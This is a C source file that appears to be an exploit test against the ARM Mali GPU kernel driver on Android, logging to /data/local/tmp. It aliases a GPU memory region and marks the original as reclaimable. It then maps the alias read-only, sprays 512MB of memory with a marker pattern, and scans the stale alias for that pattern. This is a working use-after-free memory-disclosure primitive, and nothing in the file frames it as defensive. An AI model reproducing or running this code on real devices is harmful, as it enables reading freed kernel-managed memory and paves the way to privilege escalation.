#include <stdio.h>
#include <stdarg.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdlib.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define PAGE_SHIFT 12
#define NATIVE_SIZE (32UL << 20)
#define SPRAY_SIZE  (512UL << 20)

typedef uint32_t base_context_create_flags;
typedef uint32_t base_mem_alloc_flags;

struct kbase_ioctl_version_check { uint16_t major; uint16_t minor; };
struct kbase_ioctl_set_flags { uint32_t create_flags; };
union kbase_ioctl_mem_alloc {
    struct { uint64_t va_pages; uint64_t commit_pages; uint64_t extent; uint64_t flags; } in;
    struct { uint64_t flags; uint64_t gpu_va; } out;
};
union kbase_ioctl_mem_alias {
    struct { uint64_t flags; uint64_t stride; uint64_t nents; uint64_t aliasing_info; } in;
    struct { uint64_t flags; uint64_t gpu_va; uint64_t va_pages; } out;
};
struct base_mem_handle { struct { uint64_t handle; } basep; };
struct base_mem_aliasing_info { struct base_mem_handle handle; uint64_t offset; uint64_t length; };
struct kbase_ioctl_mem_flags_change { uint64_t gpu_va; uint64_t flags; uint64_t mask; };

#define BASE_CONTEXT_SYSTEM_MONITOR_SUBMIT_DISABLED ((base_context_create_flags)1 << 1)
#define BASEP_CONTEXT_MMU_GROUP_ID_SHIFT (3)
#define BASEP_CONTEXT_MMU_GROUP_ID_MASK ((base_context_create_flags)0xF << BASEP_CONTEXT_MMU_GROUP_ID_SHIFT)
#define BASEP_CONTEXT_CREATE_KERNEL_FLAGS (BASE_CONTEXT_SYSTEM_MONITOR_SUBMIT_DISABLED | BASEP_CONTEXT_MMU_GROUP_ID_MASK)

#define BASE_MEM_MAP_TRACKING_HANDLE (3ull << 12)
#define BASE_MEM_PROT_GPU_RD ((base_mem_alloc_flags)1 << 2)
#define BASE_MEM_PROT_GPU_WR ((base_mem_alloc_flags)1 << 3)
#define BASE_MEM_PROT_CPU_RD ((base_mem_alloc_flags)1 << 0)
#define BASE_MEM_PROT_CPU_WR ((base_mem_alloc_flags)1 << 1)
#define BASE_MEM_SAME_VA ((base_mem_alloc_flags)1 << 13)
#define BASE_MEM_DONT_NEED ((base_mem_alloc_flags)1 << 17)
#define BASE_MEM_COHERENT_SYSTEM ((base_mem_alloc_flags)1 << 10)
#define BASE_MEM_COHERENT_LOCAL ((base_mem_alloc_flags)1 << 11)
#define BASE_MEM_FLAGS_MODIFIABLE (BASE_MEM_DONT_NEED | BASE_MEM_COHERENT_SYSTEM | BASE_MEM_COHERENT_LOCAL)

#define KBASE_IOCTL_TYPE 0x80
#define KBASE_IOCTL_VERSION_CHECK _IOWR(KBASE_IOCTL_TYPE, 0, struct kbase_ioctl_version_check)
#define KBASE_IOCTL_SET_FLAGS _IOW(KBASE_IOCTL_TYPE, 1, struct kbase_ioctl_set_flags)
#define KBASE_IOCTL_MEM_ALLOC _IOWR(KBASE_IOCTL_TYPE, 5, union kbase_ioctl_mem_alloc)
#define KBASE_IOCTL_MEM_ALIAS _IOWR(KBASE_IOCTL_TYPE, 21, union kbase_ioctl_mem_alias)
#define KBASE_IOCTL_MEM_FLAGS_CHANGE _IOW(KBASE_IOCTL_TYPE, 23, struct kbase_ioctl_mem_flags_change)

#define PATTERN(v) (0x4141414100000000ULL | (uint64_t)((v) >> 12))
#define IS_PATTERN(x) (((x) & 0xffffffff00000000ULL) == 0x4141414100000000ULL)

static int logfd = -1;
static void logmsg(const char *fmt, ...) {
    char buf[400];
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    if (n > 0) { write(1, buf, n); if (logfd >= 0) { write(logfd, buf, n); fsync(logfd); } }
}
static void crash_handler(int sig, siginfo_t *si, void *ctx) {
    (void)ctx;
    logmsg("[!] signal %d addr=%p\n", sig, si->si_addr);
    _exit(128 + sig);
}

int main(void) {
    logfd = open("/data/local/tmp/mali_rwtest3.log", O_WRONLY | O_CREAT | O_TRUNC | O_SYNC, 0644);
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_sigaction = crash_handler;
    sa.sa_flags = SA_SIGINFO;
    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGBUS, &sa, NULL);
    signal(SIGPIPE, SIG_IGN);

    logmsg("[*] rwtest3 pid=%d\n", getpid());

    int fd = open("/dev/mali0", O_RDWR);
    if (fd < 0) { logmsg("[-] open: %s\n", strerror(errno)); return 1; }
    struct kbase_ioctl_version_check ver = { 999, 999 };
    if (ioctl(fd, KBASE_IOCTL_VERSION_CHECK, &ver) < 0) { logmsg("[-] ver: %s\n", strerror(errno)); return 1; }
    struct kbase_ioctl_set_flags sf = { BASEP_CONTEXT_CREATE_KERNEL_FLAGS };
    if (ioctl(fd, KBASE_IOCTL_SET_FLAGS, &sf) < 0) { logmsg("[-] setflags: %s\n", strerror(errno)); return 1; }
    void *track = mmap(NULL, NATIVE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, BASE_MEM_MAP_TRACKING_HANDLE);
    if (track == MAP_FAILED) { logmsg("[-] track: %s\n", strerror(errno)); return 1; }

    union kbase_ioctl_mem_alloc ma;
    memset(&ma, 0, sizeof(ma));
    ma.in.va_pages = NATIVE_SIZE >> PAGE_SHIFT;
    ma.in.commit_pages = NATIVE_SIZE >> PAGE_SHIFT;
    ma.in.flags = BASE_MEM_SAME_VA | BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR | BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR;
    if (ioctl(fd, KBASE_IOCTL_MEM_ALLOC, &ma) < 0) { logmsg("[-] alloc: %s\n", strerror(errno)); return 1; }
    void *gpu_va = mmap(NULL, NATIVE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, ma.out.gpu_va);
    if (gpu_va == MAP_FAILED) { logmsg("[-] mmap native: %s\n", strerror(errno)); return 1; }
    for (size_t o = 0; o < NATIVE_SIZE; o += 0x1000) *(volatile uint64_t *)((char *)gpu_va + o) = 0x5a5a000000000000ULL | (o >> 12);
    logmsg("[+] native ready gpu_off=0x%llx\n", (unsigned long long)ma.out.gpu_va);

    union kbase_ioctl_mem_alias alias;
    struct base_mem_aliasing_info ai;
    memset(&alias, 0, sizeof(alias));
    alias.in.nents = 1;
    alias.in.stride = NATIVE_SIZE >> PAGE_SHIFT;
    alias.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR;
    memset(&ai, 0, sizeof(ai));
    ai.handle.basep.handle = (uint64_t)gpu_va;
    ai.length = NATIVE_SIZE >> PAGE_SHIFT;
    alias.in.aliasing_info = (uint64_t)&ai;
    if (ioctl(fd, KBASE_IOCTL_MEM_ALIAS, &alias) < 0) { logmsg("[-] alias: %s\n", strerror(errno)); return 1; }
    logmsg("[+] alias gpu=0x%llx flags=0x%llx\n", (unsigned long long)alias.out.gpu_va, (unsigned long long)alias.out.flags);

    struct kbase_ioctl_mem_flags_change fc;
    fc.gpu_va = (uint64_t)gpu_va;
    fc.mask = BASE_MEM_FLAGS_MODIFIABLE | BASE_MEM_DONT_NEED;
    fc.flags = BASE_MEM_FLAGS_MODIFIABLE | BASE_MEM_DONT_NEED;
    int frc = ioctl(fd, KBASE_IOCTL_MEM_FLAGS_CHANGE, &fc);
    logmsg("[%c] flags_change: %s\n", frc == 0 ? '+' : '-', frc == 0 ? "ok" : strerror(errno));
    if (frc < 0) return 1;

    void *alias_ro = mmap(NULL, NATIVE_SIZE, PROT_READ, MAP_SHARED, fd, alias.out.gpu_va);
    logmsg("[%c] alias mmap RO: %s\n", alias_ro == MAP_FAILED ? '-' : '+', alias_ro == MAP_FAILED ? strerror(errno) : "ok");
    if (alias_ro == MAP_FAILED) return 1;

    logmsg("[*] prefaulting alias while pages resident...\n");
    for (size_t o = 0; o < NATIVE_SIZE; o += 0x1000) (void)*(volatile uint64_t *)((char *)alias_ro + o);
    logmsg("[+] prefault done first=0x%llx last=0x%llx\n",
           (unsigned long long)*(volatile uint64_t *)alias_ro,
           (unsigned long long)*(volatile uint64_t *)((char *)alias_ro + NATIVE_SIZE - 0x1000));

    logmsg("[*] spray %luMB...\n", SPRAY_SIZE >> 20);
    unsigned char *spray = mmap(NULL, SPRAY_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (spray == MAP_FAILED) { logmsg("[-] spray: %s\n", strerror(errno)); return 1; }
    for (size_t o = 0; o < SPRAY_SIZE; o += 0x1000) *(volatile uint64_t *)(spray + o) = PATTERN(o);
    logmsg("[+] spray done\n");

    unsigned long hits = 0;
    unsigned long native_hits = 0;
    for (size_t i = 0; i < NATIVE_SIZE / 8; i++) {
        size_t off = i * 8;
        uint64_t v = *(volatile uint64_t *)((char *)alias_ro + off);
        if ((v & 0xffff000000000000ULL) == 0x5a5a000000000000ULL) native_hits++;
        if (IS_PATTERN(v)) {
            hits++;
            if (hits <= 8) logmsg("[i] hit#%lu off=0x%zx val=0x%llx\n", hits, off, (unsigned long long)v);
        }
    }
    logmsg("[%c] pattern hits: %lu, old-native qwords: %lu\n", hits ? '+' : '-', hits, native_hits);
    logmsg("[*] done\n");
    return 0;
}
